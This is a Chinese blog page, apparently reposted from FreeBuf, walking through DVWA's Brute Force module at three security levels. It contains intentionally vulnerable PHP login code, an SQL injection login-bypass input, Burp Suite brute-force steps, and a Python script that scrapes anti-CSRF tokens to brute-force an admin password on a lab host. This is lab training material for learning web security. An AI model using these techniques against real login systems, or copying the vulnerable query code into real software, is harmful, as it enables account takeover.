@@ -1,0 +1,1285 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/CNfavicon.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/CNfavicon.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="DVWA教程," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="清沐园 | wlfsky" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta name="keywords" content="DVWA教程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA之Brute Force">
+<meta property="og:url" content="http://wlfsky.com/2018/01/19/DVWA之Brute-Force/index.html">
+<meta property="og:site_name" content="清沐园 | wlfsky">
+<meta property="og:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://wlfsky.com/img/dvwa-sql-1.png">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760002264830.jpg!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760003309956.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/1476000296331.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760003769188.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/1476000377570.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760004176934.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/1476000472219.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760005155007.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/1476000526224.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760005821969.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/14760005958917.png!small">
+<meta property="og:image" content="http://image.3001.net/images/20161009/1476000620885.png!small">
+<meta property="og:updated_time" content="2018-01-19T08:19:35.041Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA之Brute Force">
+<meta name="twitter:description" content="作者：wlfsky 格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采">
+<meta name="twitter:image" content="http://wlfsky.com/img/dvwa-sql-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wlfsky.com/2018/01/19/DVWA之Brute-Force/"/>
+
+
+
+
+
+  <title>DVWA之Brute Force | 清沐园 | wlfsky</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/wlfreesky"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">清沐园 | wlfsky</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">我们终其一生都在寻找</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/life/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wlfsky.com/2018/01/19/DVWA之Brute-Force/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wlfsky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/cathand.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="清沐园 | wlfsky">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">DVWA之Brute Force</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-19T15:11:27+08:00">
+                2018-01-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-01-19T16:19:35+08:00">
+                2018-01-19
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-book"> 本文总阅读量</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,442
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <pre><code>作者：wlfsky
+格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
+</code></pre><a id="more"></a>
+<hr>
+<p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p>
+<h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
+<p>DVWA共有十个模块，分别是</p>
+<blockquote>
+<p>Brute Force（蛮力攻击）</p>
+<p>Command Injection（命令行注入）</p>
+<p>CSRF（跨站请求伪造）</p>
+<p>File Inclusion（文件包含）</p>
+<p>File Upload（文件上传）</p>
+<p>Insecure CAPTCHA （不安全的验证码）</p>
+<p>SQL Injection（SQL注入）</p>
+<p>SQL Injection（Blind）（SQL盲注）</p>
+<p>XSS（Reflected）（反射型跨站脚本）</p>
+<p>XSS（Stored）（存储型跨站脚本）</p>
+</blockquote>
+<p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p>
+<p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a><strong>Brute Force</strong></h2><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。</p>
+<p><a href="http://image.3001.net/images/20161009/14760002264830.jpg" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161009/14760002264830.jpg!small" alt="1.jpg"></a></p>
+<p><strong>下面将对四种级别的代码进行分析。</strong></p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get username </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p><strong>方法一：爆破利用burpsuite即可完成</strong></p>
+<p>第一步抓包</p>
+<p><a href="http://image.3001.net/images/20161009/14760003309956.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161009/14760003309956.png!small" alt="抓包"></a></p>
+<p>第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$</p>
+<p><a href="http://image.3001.net/images/20161009/1476000296331.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161009/1476000296331.png!small" alt="ctrl+I将包复制到intruder模块"></a></p>
+<p>第三步选中Payloads，载入字典，点击Start attack进行爆破</p>
+<p><img src="http://image.3001.net/images/20161009/14760003769188.png!small" alt="选中Payloads"><img src="http://image.3001.net/images/20161009/1476000377570.png!small" alt="点击Start attack进行爆破"></p>
+<p>最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p>
+<p><img src="http://image.3001.net/images/20161009/14760004176934.png!small" alt="找到正确密码"></p>
+<p><strong>方法二：手工sql注入</strong></p>
+<blockquote>
+<p>Username :admin’ #</p>
+<p>Password :（空）</p>
+</blockquote>
+<p>注入成功</p>
+<p><img src="http://image.3001.net/images/20161009/1476000472219.png!small" alt="注入成功"></p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( <span class="number">2</span> ); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相比Low级别的代码，Medium级别的代码主要增加mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（sleep(2)实在算不上）。</p>
+<p>具体的mysql_real_escape_string函数绕过问题详见</p>
+<p><a href="http://blog.csdn.net/hornedreaper1988/article/details/43520257" target="_blank" rel="noopener">http://blog.csdn.net/hornedreaper1988/article/details/43520257</a></p>
+<p><a href="http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html" target="_blank" rel="noopener">http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html</a></p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = stripslashes( $user ); </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = stripslashes( $pass ); </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) ); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。</p>
+<p><img src="http://image.3001.net/images/20161009/14760005155007.png!small" alt="验证登录"></p>
+<p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p>
+<p><img src="http://image.3001.net/images/20161009/1476000526224.png!small" alt="SQL查询"></p>
+<p>同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。</p>
+<p>下面是我自己写的一个脚本（python 2.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line">header=&#123;        <span class="string">'Host'</span>: <span class="string">'192.168.153.130'</span>,</span><br><span class="line">		<span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">		<span class="string">'If-None-Match'</span>: <span class="string">"307-52156c6a290c0"</span>,</span><br><span class="line">		<span class="string">'If-Modified-Since'</span>: <span class="string">'Mon, 05 Oct 2015 07:51:07 GMT'</span>,</span><br><span class="line">		<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36'</span>,</span><br><span class="line">		<span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">		<span class="string">'Referer'</span>: <span class="string">'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php'</span>,</span><br><span class="line">		<span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">		<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">		<span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'</span>&#125;</span><br><span class="line">requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(requrl,header)</span>:</span></span><br><span class="line">	req = urllib2.Request(url=requrl,headers=header)</span><br><span class="line">	response = urllib2.urlopen(req)</span><br><span class="line">	<span class="keyword">print</span> response.getcode(),</span><br><span class="line">	the_page = response.read()</span><br><span class="line">	<span class="keyword">print</span> len(the_page)</span><br><span class="line">	soup = BeautifulSoup(the_page,<span class="string">"html.parser"</span>)</span><br><span class="line">	user_token = soup.form.input.input.input.input[<span class="string">"value"</span>] <span class="comment">#get the user_token</span></span><br><span class="line">	<span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(requrl,header)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"rkolin.txt"</span>):</span><br><span class="line">	requrl = <span class="string">"http://192.168.153.130/dvwa/vulnerabilities/brute/"</span>+<span class="string">"?username=admin&amp;password="</span>+line.strip()+<span class="string">"&amp;Login=Login&amp;user_token="</span>+user_token</span><br><span class="line">	i = i+<span class="number">1</span></span><br><span class="line">	<span class="keyword">print</span> i,<span class="string">'admin'</span>,line.strip(),</span><br><span class="line">	user_token = get_token(requrl,header)</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">10</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>get_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，为了方便展示，这里设置只尝试10次。</p>
+<p>运行脚本时的Burpsuite截图</p>
+<p><img src="http://image.3001.net/images/20161009/14760005821969.png!small" alt="Burpsuite截图"></p>
+<p>打印的结果从第二行开始依次是序号、用户名、密码、http状态码以及返回的页面长度。</p>
+<p><img src="http://image.3001.net/images/20161009/14760005958917.png!small" alt="打印的结果"></p>
+<p>对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。</p>
